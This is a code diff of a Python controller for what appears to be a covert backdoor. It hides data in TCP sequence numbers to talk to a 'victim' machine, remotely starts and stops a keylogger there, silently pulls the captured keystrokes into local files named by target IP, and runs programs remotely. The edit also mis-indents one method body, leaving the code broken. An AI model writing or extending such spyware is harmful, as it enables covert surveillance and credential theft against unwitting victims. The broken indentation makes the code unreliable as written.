@@ -118,43 +118,109 @@ class Commander:
         print("="*50 + "\n")
 
     def start_output_listener(self):
-        """Continuous sniffer for the RX port to print covert data."""
-        def process_packet(pkt):
-            if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
-                char_code = pkt[TCP].seq % 256
-                if char_code != 0:
-                    with self.output_lock:
-                        self.output_buffer += chr(char_code)
+    """Continuous sniffer for the RX port to print covert data."""
+    self.output_buffer = ""  # Initialize buffer
+    def process_packet(pkt):
+        if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
+            char_code = pkt[TCP].seq % 256
+            if char_code != 0:
+                with self.output_lock:
+                    self.output_buffer += chr(char_code)
 
-        try:
-            sniff(
-                filter=f"tcp dst port {self.rx_port}", 
-                prn=process_packet,
-                stop_filter=lambda x: not self.is_connected
-            )
-        except Exception as e:
-            if self.is_connected:
-                print(f"\n[!] Listener error: {e}")
-    # === Connected Menu Actions ===
-    
+    try:
+        sniff(
+            filter=f"tcp dst port {self.rx_port}", 
+            prn=process_packet,
+            stop_filter=lambda x: not self.is_connected
+        )
+    except Exception as e:
+        if self.is_connected:
+            print(f"\n[!] Listener error: {e}")
+
+    def display_output(self, timeout=3):
+        """Wait for and display buffered output."""
+        start_time = time.time()
+        last_buffer_len = 0
+        
+        while time.time() - start_time < timeout:
+            time.sleep(0.2)
+            with self.output_lock:
+                if len(self.output_buffer) == last_buffer_len:
+                    if last_buffer_len > 0:
+                        break
+                last_buffer_len = len(self.output_buffer)
+        
+        with self.output_lock:
+            if self.output_buffer:
+                print(self.output_buffer, end='')
+                self.output_buffer = ""
+            else:
+                print("[No response from victim]")
+        print("="*50 + "\n")
+
     def handle_start_keylogger(self):
         """Option 1: Start the keylogger on the victim."""
+        with self.output_lock:
+            self.output_buffer = ""
         print("[*] Starting keylogger on victim...")
         self.send_covert_command("START_KEY")
-        time.sleep(0.3)
+        time.sleep(0.5)
+        print("[*] Waiting for confirmation...")
+        self.display_output(timeout=2)
 
     def handle_stop_keylogger(self):
         """Option 2: Stop the keylogger and delete log file."""
+        with self.output_lock:
+            self.output_buffer = ""
         print("[*] Stopping keylogger on victim...")
         self.send_covert_command("STOP_KEY")
-        time.sleep(0.3)
+        time.sleep(0.5)
+        print("[*] Waiting for confirmation...")
+        self.display_output(timeout=2)
 
     def handle_get_log(self):
-        """Option 3: Transfer the key log file from the victim."""
-        print("[*] Requesting keylog file...")
+        """Option 3: Transfer the key log file from the victim and save locally (Silent)."""
+        with self.output_lock:
+            self.output_buffer = ""
+        
+        # Generate a timestamped filename for the keylog
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        save_dir = "./keylogs"
+        os.makedirs(save_dir, exist_ok=True)
+        save_path = f"{save_dir}/keylog_{self.target_ip}_{timestamp}.txt"
+        
+        print(f"[*] Requesting keylog file from {self.target_ip}...")
         self.send_covert_command("GET_LOG")
-        print("\n[*] Waiting for keylog data (output will appear above)...")
-        time.sleep(1)
+        
+        # Wait for data silently
+        start_time = time.time()
+        last_buffer_len = 0
+        timeout = 10  # Increased timeout for larger files
+        
+        while time.time() - start_time < timeout:
+            time.sleep(0.3)
+            with self.output_lock:
+                current_len = len(self.output_buffer)
+                if current_len == last_buffer_len and current_len > 0:
+                    # No new data for 0.3 seconds, consider transfer complete
+                    break
+                last_buffer_len = current_len
+        
+        # Save the received data to file (Silent)
+        with self.output_lock:
+            if self.output_buffer:
+                # Strip the KEYLOG markers if present
+                content = self.output_buffer.replace("=== KEYLOG START ===\n", "")
+                content = content.replace("=== KEYLOG END ===\n", "")
+                
+                with open(save_path, "w") as f:
+                    f.write(content)
+                
+                print(f"[+] Keylog transferred and saved to: {save_path}")
+                print(f"[+] Total bytes received: {len(content)}")
+                self.output_buffer = ""
+            else:
+                print("[!] No keylog data received")
 
     def handle_exec(self):
         """Option 4: Run program and display output."""
